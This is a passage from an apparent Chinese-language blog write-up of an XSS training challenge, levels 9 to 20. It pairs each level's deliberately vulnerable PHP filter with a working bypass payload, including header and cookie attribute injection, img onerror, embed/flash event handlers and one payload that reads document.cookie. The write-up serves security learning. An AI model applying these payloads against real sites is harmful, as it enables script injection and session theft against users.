+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="ni">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>
+</span></span></code></pre></div><h3 id="level9">level9</h3>
+<p>在level8的基础上加入了对于url的审核，但是只检查是否存在 <code>http://</code> ,放到alert的内容即可 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">,</span><span class="s2">&#34;scr_ipt&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;on&#34;</span><span class="p">,</span><span class="s2">&#34;o_n&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str4</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">,</span><span class="s2">&#34;sr_c&#34;</span><span class="p">,</span><span class="nv">$str3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str5</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;da_ta&#34;</span><span class="p">,</span><span class="nv">$str4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str6</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;href&#34;</span><span class="p">,</span><span class="s2">&#34;hr_ef&#34;</span><span class="p">,</span><span class="nv">$str5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str7</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;quot&#39;</span><span class="p">,</span><span class="nv">$str6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form action=level9.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=keyword  value=&#34;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input type=submit name=submit value=添加友情链接 /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">if(false===strpos($str7,&#39;http://&#39;))
+</span></span></span><span class="line"><span class="cl"><span class="err">{
+</span></span></span><span class="line"><span class="cl"><span class="err">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;您的链接不合法？有没有！&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">else
+</span></span></span><span class="line"><span class="cl"><span class="err">{
+</span></span></span><span class="line"><span class="cl"><span class="err">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;&#39;.$str7.&#39;&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?keyword=javascr%09ipt:alert(&#39;http://&#39;)&amp;submit=添加友情链接
+</span></span></code></pre></div><h3 id="level10">level10</h3>
+<p>我们仔细看源码，虽然在keyword这里做了括号的替换，导致无法闭合 <code>&lt;h2&gt;</code> 但是这里还有一个t_sort可以利用，我们要做的就是插入JS，同时让这个隐藏的输入框出现可以被点击 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str11</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;t_sort&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str22</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str33</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str22</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form id=search&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_link&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_history&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_sort&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str33</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34; type=&#34;</span><span class="nx">hidden</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p>注意要用双引号 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&amp;t_sort=&#34; type=&#34;text&#34; onclick=&#34;alert(1)
+</span></span></code></pre></div><h3 id="level11">level11</h3>
+<p>通过观察源码我们发现level10中的t_sort也无法闭合了，但是出现了需要修改的HTTP-REFERER来完成注入 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str00</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;t_sort&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str11</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str22</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str33</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str22</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form id=search&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_link&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_history&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_sort&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str00</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_ref&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str33</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34; type=&#34;</span><span class="nx">hidden</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-18_16-24-50_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HTTP_USER_AGENT: &#34; type=&#34;text&#34; onclick=&#34;alert(1)
+</span></span></code></pre></div><h3 id="level12">level12</h3>
+<p>与level11一样的套路，只不过是换一个header罢了，然后别忘了显示输入框 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str00</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;t_sort&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str11</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str22</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str33</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str22</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form id=search&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_link&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_history&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_sort&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str00</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_ua&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str33</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34; type=&#34;</span><span class="nx">hidden</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-18_17-52-54_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User-Agent:&#34; type=&#34;text&#34; onclick=&#34;alert(1)
+</span></span></code></pre></div><h3 id="level13">level13</h3>
+<p>修改cookie <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;call me maybe?&#34;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str00</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;t_sort&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str11</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str22</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str33</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str22</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form id=search&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_link&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_history&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_sort&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str00</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=&#34;t_cook&#34;  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str33</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34; type=&#34;</span><span class="nx">hidden</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-18_17-54-35_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cookie: user=&#34; type=&#34;text&#34; onclick=&#34;alert(1)
+</span></span></code></pre></div><h3 id="level14">level14</h3>
+<p>没有正常加载暂且搁置 <!-- raw HTML omitted --></p>
+<h3 id="level15">level15</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;src&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;body&gt;&lt;span class=&#34;ng-include:&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34;&gt;&lt;/span&gt;&lt;/body&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>AngularJS <code>ng-include</code> 函数可以用于嵌入html <!-- raw HTML omitted --></p>
+<p>我们通过嵌入level1的内容，同样可以执行想要的代码，这里要注意过滤了括号，所以要改变我们原来用在level1的payload <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;
+</span></span></code></pre></div><h3 id="level16">level16</h3>
+<p>观察源码我们可以发现level16对于很多特殊字符都做了替换 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">,</span><span class="s2">&#34;&amp;nbsp;&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span><span class="s2">&#34;&amp;nbsp;&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str4</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="s2">&#34;&amp;nbsp;&#34;</span><span class="p">,</span><span class="nv">$str3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str5</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;	&#34;</span><span class="p">,</span><span class="s2">&#34;&amp;nbsp;&#34;</span><span class="p">,</span><span class="nv">$str4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;center&gt;&#34;</span><span class="o">.</span><span class="nv">$str5</span><span class="o">.</span><span class="s2">&#34;&lt;/center&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="err">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str5).&#34;&lt;/h3&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></div><p>我们可以用html编码来绕过，但是之前的方式都需要闭合 <code>&lt;h3&gt;</code> ，但现在斜杠被过滤，我们只能采取一种新的方法，就是我们用在level15中的 <code>img</code> tag <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;
+</span></span></code></pre></div><h3 id="level17">level17</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;embed src=xsf01.swf?&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;arg01&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;=&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;arg02&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34; width=100% heigth=100%&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>embed标签可以嵌入swf文件（flash） <!-- raw HTML omitted --></p>
+<p>设置一个onmouseover事件，鼠标放到上面即可，firefox确实试不出来，chrome可以，应该是某种安全机制 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?arg01=a&amp;arg02=%20onmouseover=alert(1)
+</span></span></code></pre></div><h3 id="level18">level18</h3>
+<p>level18在level17的基础上加了特殊字符的过滤，但是我们原本的payload也够用了 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;embed src=xsf02.swf?&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;arg01&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;=&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;arg02&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34; width=100% heigth=100%&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?arg01=a&amp;arg02=%20onmouseover=alert(1)
+</span></span></code></pre></div><h3 id="level19">level19</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;embed src=&#34;xsf03.swf?&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;arg01&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;=&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;arg02&#34;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&#34; width=100% heigth=100%&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>使用工具<a class="link" href="https://github.com/jindrapetrik/jpexs-decompiler"  target="_blank" rel="noopener"
+    >jpexs-decompiler</a> 对xsf03.swf flash文件进行反汇编，找到可以放入xss注入代码的地方 <!-- raw HTML omitted --></p>
+<p>首先定位到函数getURL，这里应该是会获取当前网页的url <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-18_22-23-36_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>version的内容可以决定 <code>loc4_</code> 的值 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-18_22-28-52_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>检测到又 <code>&lt;a&gt;</code> 形成的link才会执行 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-18_22-29-51_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>实话实说这里我确实也没怎么搞懂，jpexs-decompiler大概就是一个和ida差不多的内容，通过反汇编flash文件，然后表达成我们看得懂的语言。 <!-- raw HTML omitted --></p>
+<p>这里的话感觉就是 <code>arg01</code> ， <code>arg02</code> 能够形成一对flash参数的键值对，从而对flash的运行造成一些影响 <!-- raw HTML omitted --></p>
+<p>那么这里就是如果设置了version的值就会引发一些参数调用，从而使我们注入的脚本能够被执行。 <!-- raw HTML omitted --></p>
+<p>如果有说错的地方希望各位师傅在评论区纠正和分享正确的思路，我对这方面不熟悉，这里走个流程了解一下工具。 <!-- raw HTML omitted -->
+实际实验在本地以及网页端包括firefox，chrome也没有成功，还是贴一下晚上的payload <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">arg01=version&amp;arg02=&lt;a href=&#34;javascript:alert(1)&#34;&gt;123&lt;/a&gt;
+</span></span></code></pre></div><h3 id="level-20">level 20</h3>
+<p>还是贴一下网上的payload <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">level20.php?arg01=a&amp;arg02=\&#34;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height
+</span></span><span class="line"><span class="cl">?arg01=id&amp;arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height
+</span></span></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+            <a href="/tags/xss/">xss</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 18, 2022 22:40 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
